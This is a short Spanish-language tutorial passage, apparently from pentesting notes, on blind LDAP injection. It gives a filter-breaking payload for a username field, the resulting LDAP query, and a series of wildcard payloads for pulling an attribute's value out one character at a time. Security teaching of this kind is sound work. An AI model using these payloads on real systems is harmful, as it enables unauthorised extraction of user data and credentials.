### Tecnica de exfiltración
Funciona igual que las BLIND SQLI. Necesitaremos que la página haga un cambio para poder conocer el acierto.

Podemos utilizar el wildcard dentro de un universaly true para poder exfiltrar datos de un atributo mediante blind exploitation:

    user)(|(description=*          invalid)

Esto dejaría la query de la siguiente manera:

    (&(uid=user)(|(description=*)(password=invalid)))

De esta manera, si el user tuviera el atributo description asignado podríamos exfiltrar caracter a caracter de manera iterativa el valor del atributo:

    user)(|(description=a*          invalid)
    user)(|(description=ab*          invalid)
    user)(|(description=abc*          invalid)

